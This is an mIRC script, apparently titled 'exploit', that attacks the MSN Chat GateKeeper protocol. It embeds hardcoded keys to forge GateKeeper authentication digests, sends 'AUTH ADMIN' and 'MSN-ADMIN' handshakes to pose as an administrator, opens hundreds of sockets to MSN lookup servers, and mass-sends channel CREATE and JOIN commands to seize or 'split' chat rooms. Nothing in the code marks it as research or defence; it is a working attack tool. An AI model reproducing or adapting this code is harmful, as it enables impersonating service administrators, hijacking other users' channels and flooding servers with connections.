alias -l escapeCharacters {

  ; // 
  ; * Includes or decludes escape characters in ASCII strings
  ;
  ; * String (String) $$1
  ; * Include (Boolean, Optional) Include, Declude
  ; //

  var %string, %include
  %string = $$1
  %include = $2

  var %counter, %output, %character
  %counter = 1
  %output = ""

  if ( %include ) {
    while ( %counter <= $len(%string) ) { 
      %character = $mid( %string, %counter, 1 )
      %character = $asc(%character)
      if ( %character == 0 ) { %output = $+( %output, \0 ) }
      elseif ( %character == 9 ) { %output = $+( %output, \t ) }
      elseif ( %character == 10 ) { %output = $+( %output, \n ) }
      elseif ( %character == 13 ) { %output = $+( %output, \r ) }
      elseif ( %character == 32 ) { %output = $+( %output, \b ) }
      elseif ( %character == 44 ) { %output = $+( %output, \c ) }
      elseif ( %character == 92 ) { %output = $+( %output, \\ ) }
      else { %output = $+( %output, $mid( %string, %counter, 1 ) ) }
      inc %counter
    }
    return %output
  }

  else {
    while ( %counter <= $len(%string) ) {
      %character = $mid( %string, %counter, 1 )
      if ( %character == \ ) {
        %character = $mid( %string, %counter, 2 )
        if ( %character == \0 ) { %output = $+( %output, $chr(0) ) }
        elseif ( %character == \t ) { %output = $+( %output, $chr(9) ) }
        elseif ( %character == \n ) { %output = $+( %output, $chr(10) ) }
        elseif ( %character == \r ) { %output = $+( %output, $chr(13) ) }
        elseif ( %character == \b ) { %output = $+( %output, \"SPACE"\ ) }
        elseif ( %character == \c ) { %output = $+( %output, $chr(44) ) }
        elseif ( %character == \\ ) { %output = $+( %output, $chr(92) ) }
        inc %counter 2
      }
      else {
        if ( $asc(%character) == 32 ) { %character = \"SPACE"\ }
        %output = $+( %output, %character ) 
        inc %counter
      }
    }
    return $replace( %output, \"SPACE"\, $chr(32) )
  }

}

alias -l hexConvert {

  ; --
  ; (String) Hex string
  ; (Boolean, Optional) Ascii, denary
  ; --

  var %string, %asc
  %string = $$1
  %asc = $2

  if ( %asc ) { 
    var %counter, %output, %character
    %counter = 1 
    %output = ""
    while ( %counter <= $len(%string) ) {
      %character = $mid( %string, %counter, 2 )
      %character = $base( %character, 16, 10 )
      %character = $chr(%character)
      %output = $+( %output, %character )
      inc %counter 2
    }
    return %output
  }

  else { return $base( %string, 16, 10 ) }

}

alias -l denaryConvert {

  ; --
  ; (String) Ascii/Denary string
  ; (Boolean, Optional) From ascii, From denary
  ; --

  var %string, %asc
  %string = $$1 
  %asc = $2

  if ( %asc ) {
    var %counter, %output, %character
    %counter = 1
    %output = ""
    while ( %counter <= $len(%string) ) {
      %character = $mid( %string, %counter, 1 )
      %character = $asc(%character)
      %character = $base( %character, 10, 16 )
      %output = $+( %output, %character )
      inc %counter
    }
    return %output
  }

  else { return $base( %string, 10, 16 ) }

}

alias -l ocxKeyFirst { return edp{}e|wxrdse}}u666666666666666666666666666666666666666666666666 }

alias -l ocxKeySecond { return $+( , $chr(26), \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ) }

alias -l character { 

  ; --
  ; (String) String to be converted into character
  ; --

  var %string
  %string = $$1

  return $left( %string, 1 )

}

alias -l ocxMessageDigest { 

  ; --
  ; (String) 8 byte string
  ; --

  var %auth
  %auth = $$1 

  %auth = $escapeCharacters(%auth) 
  %auth = $+( $ocxKeyFirst, %auth )
  %auth = $MD5(%auth)
  %auth = $hexConvert( %auth, 1 )
  %auth = $+( $ocxKeySecond, %auth )
  %auth = $MD5(%auth)
  %auth = $hexConvert( %auth, 1 )
  %auth = $escapeCharacters( %auth, 1 )

  return %auth

}

on *:start:{
  .hmake exploit 200
  $+( .timer, $hash ) -m 1 300 $!init
}

menu status,channel {
  exploit
  .$submenu($channels($1))
  .$+( Add channel, $chr(9), - ... ) {
    var %channel, %cat
    %channel = $$?="Channel to add ?"
    %cat = $?="Category for %channel ?"
    while ( !$regex( %cat, [A-Z]{2} ) ) { 
      %cat = $?="Please use a correct category or press cancel"
    }
    $addChannel( %channel, %cat ) 
  }
  .- 
  .$+( Sockets, $chr(9), - $gVar(sockets) ) : $sVar( sockets, $$?="Sockets ?" )
  .$+( Debug, $chr(9), - $iif( %split.debug == on, on, off ) ) : set %split.debug $iif( %split.debug == on, off, on )
  .$+( Connect, $chr(9), - ) : $exploit
  .$+( Lookups, $chr(9), - ) : $lookupPing
  .$+( Distribute, $chr(9), - ) : $distributeSockets
  .$+( Status, $chr(9), - ) : $splitStatus
}

alias -l sIni { writeini -n exploit.ini $$1 $$2 $$3 }
alias -l gIni { return $readini( exploit.ini, $$1, $$2 ) }
alias -l sVar { set %exploit. [ $+ [ $$1 ] ] $$2 }
alias -l gVar { return %exploit. [ $+ [ $$1 ] ] }
alias -l sHash { hadd exploit $$1 $$2 }
alias -l gHash { return $hget( exploit, $$1 ) }

alias -l init {
  if ( !$gVar( sockets ) ) { $sVar( sockets, 300 ) }
  if ( !$ini( exploit.ini, lookups, 0 ) ) { $lookupPing }
  $print( 2, -s, $+( $chr(3), 5exploit initialised. ) )
}

alias -l hex { return $base( $$1, 10, 16 ) }
alias -l rHex { return $hex($r( 0, 15 )) }
alias -l hexString { return $+( $rHex, $rHex, $rHex, $rHex, $rHex, $rHex, $rHex, $rHex ) }

alias -l hash { return $MD5($hexString) }
alias test { echo -a test.. $hash }

alias -l maxLookup { return $ini( exploit.ini, lookups, 0 ) }
alias -l randomLookup { return $iif( $maxLookup, $ini( exploit.ini, lookups, $r( 1, $maxLookup ) ), 207.68.167.253 ) }

alias -l setSocketsMax { $sHash( socketsMax, $$1 ) }
alias -l getSocketsMax { return $gHash(socketsMax) }
alias -l setSocketsCon { $sHash( socketsCon, $1 ) }
alias -l getSocketsCon { return $gHash(socketsCon) }
alias -l incSocketsCon { hinc exploit socketsCon }
alias -l socketsReady { return $iif( $getSocketsCon >= $getSocketsMax, 1, 0 ) }

alias -l setConTicks { $sHash( conTicks, $$1 ) }
alias -l getConTicks { return $gHash( conTicks ) }

alias -l getStatus { return $gHash(status) }
alias -l setStatus { $sHash( status, $$1 ) }

alias -l setConTime { $sHash( conTime, $$1 ) }
alias -l getConTime { return $gHash( conTime ) }

alias -l maxChannel { return $ini( exploit.ini, channels, 0 ) }
alias -l getChannel { return $ini( exploit.ini, channels, $$1 ) }
alias -l getCat { return $readini( exploit.ini, channels, $$1 ) }

alias -l setPass { $sIni( keys, $$1, $+( $r(a,z), $r(a,z) ) ) }
alias -l getPass { return $gIni( keys, $$1 ) }

alias -l incFindChannel { hinc exploit channel. [ $+ [ $$1 ] ] }
alias -l getFindChannel { return $gHash( channel. [ $+ [ $$1 ] ] ) }
alias -l unsetFindChannel { $sHash( channel. [ $+ [ $$1 ] ], 0 ) }

alias -l channels {
  if ( $1 == begin || $1 == end ) { return - }
  elseif ( $getChannel($1) ) { return $+( $getCategory($1), $chr(9), - $getChannel($1) ) : delChannel $1 }
} 

alias -l maxChannel { return $ini( exploit.ini, channels, 0 ) }
alias -l getChannel { return $ini( exploit.ini, channels, $$1 ) }
alias -l getCategory { return $gIni( channels, $getChannel($$1) ) }
alias -l delChannel { 
  var %channel
  %channel = $getChannel($$1)
  remini -n exploit.ini channels %channel
  remini -n exploit.ini %channel
}
alias -l addChannel {
  var %channel, %cat
  %channel = $$1
  %channel = $remove( %channel, $chr(37), $chr(35) )
  %channel = $replace( %channel, $chr(32), \b )
  %channel = $+( $chr(35), %channel )
  %cat = $iif( $2, $2, CP )
  $sIni( channels, %channel, %cat )
}

alias -l exploit {
  var %sockets
  %sockets = $gVar(sockets)
  $setSocketsMax(%sockets)
  $setSocketsCon(0)
  $setStatus(connecting)
  $print( , -s, Connecting %sockets sockets )
  $+( .timer, $hash ) -m %sockets 200 $!connect
  $setConTicks($ticks)
}

alias -l connect { 
  var %host, %socket
  %host = $randomLookup
  %socket = $iif( $1, $1, $hash )
  %socket = $+( WB., %socket )
  sockopen %socket %host 6667
  sockmark %socket $$2
}

on *:sockopen:WB.*:{ 
  set %startticks. [ $+ [ $sockname ] ] $ticks
  if ( $sockerr ) { 
    var %host
    %host = $sock($sockname).ip
    inc -u5 %disconnected
    inc -u6 %down. [ $+ [ %host ] ]
    if ( %down. [ $+ [ %host ] ] >= 5 ) { 
      remini exploit.ini lookups %host
      $print( 5, -s, %host is down. It has been removed from the lookup server's list ) 
    }
    if ( %disconnected <= 6 ) { $connect }
    sockclose $sockname
  }
  else { sockwrite -n $sockname $+( nick $hexString, $crlf, AUTH GateKeeperPassport I GKSSP\0, $chr(1), r, $chr(2), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC8 MSN-ADMIN!exploit ) }
}

on *:sockread:WB.*:{

  var %r
  sockread %r 
  $debug( $sock($sockname).mark, %r )
  if ( AUTH GateKeeperPassport S isin %r ) { 
    var %counter, %length, %auth
    %counter = 1
    %length = 8 
    while ( %counter <= %length ) {
      if ( $character($right( %r, %length )) == \ ) {
        inc %counter
        inc %length
      }  
      inc %counter
    }
    %auth = $right( %r, %length )
    %auth = $ocxMessageDigest(%auth)
    %auth = $+( %auth, $str( \0, 16 ) )
    %auth = $+( AUTH ADMIN S GKSSP\0\0\0, $chr(3), \0\0\0, $chr(3), \0\0\0, %auth )
    sockwrite -n $sockname $+( %auth, $crlf, AUTH ADMIN S $getCurAuthString, $crlf, PROP $ SUBSCRIBERINFO $getCurSub )
    var %x = %startticks. [ $+ [ $sockname ] ]
    echo -s $sockname has authenticated in $calc($ticks - %x)
  } 
  elseif ( AUTH ADMIN S isin %r ) {
    $print( , -s, $+( $chr(3), 5, $sockname connected ) )
    $+( .timer, $gettok( $sockname, 2, 46 ) ) -m 0 $r( 1800, 1900 ) keepAlive $sockname
    $incSocketsCon
    if ( $socketsReady ) && ( $getStatus == connecting ) {
      $print( 5, -s, $+( $getSocketsMax sockets are ready $chr(3), 2, $chr(40), $calc(( $ticks - $getConTicks ) / 1000), s, $chr(41) - $sock( WB.*, 0 ) connected. ) )
      $setStatus(active)
      $setConTime($ctime)
      $sHash( close, 0 )
    }
  }
  elseif ( $gettok( %r, 2, 32 ) == 613 ) {
    var %host, %chan, %sock, %key
    %host = $mid( $gettok( %r, 4, 32 ), 2 )
    %chan = $sock($sockname).mark
    %sock = $calc( $right( %host, 3 ) - 156 )
    %sock = $+( TK2CHATCHATA0, %sock, .* ) 
    %key = $getPass(%chan)
    $setKey( %chan, server, %host )
    $setKey( %chan, q, %key )
    %chan = $+( $chr(37), %chan )
    if ( $sock(%sock) ) { 
      if ( $getSock(%chan) ) { sockclose $ifmatch }
      $delSock(%chan)
      sockwrite -n %sock JOIN %chan %key
    }
    $guest( %host, %chan )
    $displayGot(%chan)
  }
}

on *:sockclose:WB.*:{ 
  $connect( $hash, $sock($sockname).mark )
  hinc exploit close
}

alias -l keepAlive {
  if ( $sock($$1) ) { 
    if ( $getStatus == creating ) && ( $getCat($sock($1).mark) ) {
      var %chan, %cat, %key
      %chan = $sock($1).mark
      %cat = $getCat(%chan)
      %key = $getPass(%chan)
      %chan = $+( $chr(37), %chan )
      sockwrite -n $1 CREATE %cat %chan - - EN-US 1 %key 0
    }
    else { sockwrite -n $1 }
  }
  else { $+( .timer, $gettok( $1, 2, 46 ) ) off }
}

alias -l lookupPing { 
  var %lookups, %counter, %max, %lookup
  %lookups = 141,142,144,145,184
  %counter = 1
  %max = $numtok( %lookups, 44 )
  remini exploit.ini lookups
  $print( 2, -s, Finding currently connected lookup servers )
  while ( %counter <= %max ) {
    %lookup = $gettok( %lookups, %counter, 44 )
    sockopen $+( lookupPing., $hash ) $+( 207.68.167., %lookup ) 6667 
    inc %counter
  }
}

on *:sockopen:lookupPing.*:{
  if ( !$sockerr ) {
    var %host
    %host = $sock($sockname).ip
    writeini -n exploit.ini lookups %host %host
    $print( 2, -s, Found lookup server %host )
  }
  sockclose $sockname
}

alias -l distributeSockets {
  $print( 2, -s, Distributing channels on sockets )
  var %counter, %max, %maxChans, %sock, %chan, %ini
  %counter = 1
  %chan = 1
  %max = $sock( WB.*, 0 )
  %maxChans = $maxChannel
  $setStatus(active)
  while ( %counter <= %maxChans ) { 
    %ini = $getChannel(%counter)
    if ( !$getPass(%ini) ) { $setPass(%ini) }
    $unsetFindChannel(%ini)
    inc %counter
  }
  %counter = 1
  while ( %counter <= %max ) {
    %sock = $sock( WB.*, %counter )
    %ini = $getChannel(%chan)
    sockmark %sock %ini
    if ( %chan >= %maxChans ) { %chan = 1 }
    else { inc %chan }
    inc %counter 
    $incFindChannel(%ini)
  }
  $setStatus(creating)
}

alias -l guest {
  var %sock, %host, %chan
  %sock = $hash
  %sock = $+( guest., %sock ) 
  %host = $$1
  %chan = $$2
  sockopen %sock %host 6667
  sockmark %sock %chan
}

on *:sockopen:guest.*:{ 
  if ( $sockerr ) { 
    var %sock
    %sock = $sockname
    $guest( $sock(%sock).ip, $sock(%sock).mark )
  }
  else {
    sockwrite -n $sockname $+( AUTH GateKeeper I GKSSP\0, $chr(1), r, $chr(2), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC8 MSNTV-TELCO!exploit )
  } 
}

on *:sockread:guest.*:{
  var %r 
  sockread %r
  if ( AUTH GateKeeper S :GKSSP??????* iswm %r ) {
    var %counter, %length, %auth
    %counter = 1
    %length = 8 
    while ( %counter <= %length ) {
      if ( $character($right( %r, %length )) == \ ) {
        inc %counter
        inc %length
      }  
      inc %counter
    }
    %auth = $right( %r, %length )
    %auth = $ocxMessageDigest(%auth)
    %auth = $+( %auth, $str( $chr(255), 16 ) )
    %auth = $+( AUTH ADMIN S GKSSP\0\0\0, $chr(3), \0\0\0, $chr(3), \0\0\0, %auth )
    sockwrite -n $sockname $+( %auth, $crlf, NICK >, $hash, $crlf, JOIN $sock($sockname).mark ) 
    $+( .timer, $sockname ) -m 0 6000 keepAliveGuest $sockname
  }
  elseif ( $gettok( %r, 1, 32 ) == PING ) { 
    sockwrite -n $sockname $replace( %r, PING, PONG ) 
  } 
  elseif ( $gettok( %r, 2, 32 ) == JOIN ) && ( $mid( $gettok( %r, 1, 33 ), 2 ) == $me ) { 
    sockwrite -n $sockname QUIT $+( :, $hash )
    inc -u3 %guestQuit. [ $+ [ $sockname ] ]
  }
}

alias -l keepAliveGuest {
  if ( $sock($$1) ) { 
    sockwrite -n $1
  }
  else { 
    $+( .timer, $$1 ) off
  }
}

on *:sockclose:guest.*:{
  if ( !%guestQuit. [ $+ [ $sockname ] ] ) {
    var %chan, %host
    %chan = $sock($sockname).mark
    %host = $sock($sockname).ip
    $guest( %host, %chan )
  }
}

alias -l displayGot {
  var %win, %chan
  %win = $$1
  %win = $+( @split., %win )
  %chan = $mid( $$1, 2 )
  window -ahbdp +fL %win 0 $calc( 150 * $window( @split.*, 0 ) ) 200 150 courier 12
  drawpic -s %win 0 0 16 16 chan.ico
  drawline -r %win $rgb( 0, 0, 50 ) 2 -1 17 400 16
  drawtext -ro %win $rgb( 0, 0, 50 ) "tahoma" 12 18 1 $asctime( dddd dd h:nn TT )
  if ( $len(%chan) > 10 ) {
    %chan = $+( $left( %chan, 9 ), ... )
    drawtext -r %win $rgb( 0, 0, 50 ) "digit cube" 26 18 35 %chan
  }
  else {
    drawtext -r %win $rgb( 0, 0, 50 ) "digit cube" 26 $alignLenAlg(%chan) 40 %chan
  }
  drawtext -r %win $rgb( 0, 0, 50 ) "digit cube" 26 30 65 has split
  drawtext -r %win $rgb( 0, 0, 50 ) "tahoma" 12 80 120 close
}

alias -l alignLenAlg {
  var %len, %const
  %len = $len($$1)
  %const = $calc( 10 - %len )
  %len = $calc( ( 15 + ( %const * 9 ) ) - %const )
  return %len
}

menu @split.* {
  sclick {
    if ( $mouse.x >= 80 && $mouse.y >= 120 ) && ( $mouse.x <= 110 && $mouse.y <= 132 ) { 
      window -c $menu
    }
  }
}

alias -l splitStatus {
  if ( $getStatus != connecting ) {
    $print( 5, -ae, exploit status... )
    $print( 2, -a, Sockets - $sock( WB.*, 0 ) )
    $print( 2, -a, Open - $duration($calc( $ctime - $getConTime )) )
    $print( 2, -a, Dropped - $gHash(close) )
    var %counter, %max, %channel
    %counter = 1
    %max = $sock( WB.*, 0 ) 
    %channel
    .hmake temp
    while ( %counter <= %max ) {
      %channel = $sock( WB.*, %counter ).mark
      hinc temp %channel
      inc %counter
    }
    %counter = 1
    %max = $hget( temp, 0 ).item
    $print( 2, -a, Channels - %max )
    while ( %counter <= %max ) {
      %channel = $hget( temp, %counter ).item
      $print( 2, -a, %channel - $hget( temp, %channel ) sockets )
      inc %counter
    }
    $print( 5, -ae, exploit status... )
    .hfree temp
  }
  else {
    $print( 5, -ae, exploit status... )
    $print( 2, -a, Connecting... )
    $print( 5, -ae, exploit status... )
  }
}

alias -l debug {
  if ( %split.debug == on ) && ( $1 ) {
    if ( !$window(@exploit) ) { window @exploit }
    echo @exploit $1 - $2
  }
}
